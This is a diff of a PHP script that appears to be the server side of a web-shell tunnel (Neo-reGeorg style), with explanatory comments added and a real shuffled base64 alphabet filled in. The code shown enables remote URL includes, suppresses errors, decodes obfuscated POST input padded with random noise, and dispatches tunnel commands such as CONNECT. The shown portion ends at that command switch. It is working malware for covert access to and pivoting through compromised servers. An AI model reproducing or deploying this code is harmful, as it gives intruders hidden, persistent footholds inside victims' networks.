@@ -1,11 +1,14 @@
 <?php
+// config
 ini_set("allow_url_fopen", true);
 ini_set("allow_url_include", true);
 ini_set('always_populate_raw_post_data', -1);
 error_reporting(E_ERROR | E_PARSE);
 
+// HTTP response code Handling : send arbitrary code as response
 if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(HTTPCODE);
 
+// decode binary to string
 function blv_decode($data) {
     $data_len = strlen($data);
     $info = array();
@@ -22,6 +25,9 @@ function blv_decode($data) {
     return $info;
 }
 
+
+//encode string to binary format
+
 function blv_encode($info) {
     $data = "";
     $info[0] = randstr();
@@ -35,6 +41,8 @@ function blv_encode($info) {
     return $data;
 }
 
+
+// generate random string for noise
 function randstr() {
     $rand = '';
     $length = mt_rand(5, 20);
@@ -44,6 +52,7 @@ function randstr() {
     return $rand;
 }
 
+// indexes of info array to store input 
 $DATA          = 1;
 $CMD           = 2;
 $MARK          = 3;
@@ -55,8 +64,10 @@ $REDIRECTURL   = 8;
 $FORCEREDIRECT = 9;
 
 $en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-$de = "BASE64 CHARSLIST";
+$de = "4brZlX06y+SFgxhVsuM2twHP8BAq7C1a5IjLDU9finKWGEpRezYmdJ/cv3OkNQoT";
 
+
+//extracting input 
 $post_data = file_get_contents("php://input");
 if (USE_REQUEST_TEMPLATE == 1) {
     $post_data = substr($post_data, START_INDEX);
@@ -70,6 +81,10 @@ $cmd = $info[$CMD];
 $run = "run".$mark;
 $writebuf = "writebuf".$mark;
 $readbuf = "readbuf".$mark;
+
+
+
+//command handling
 
 switch($cmd){
     case "CONNECT":
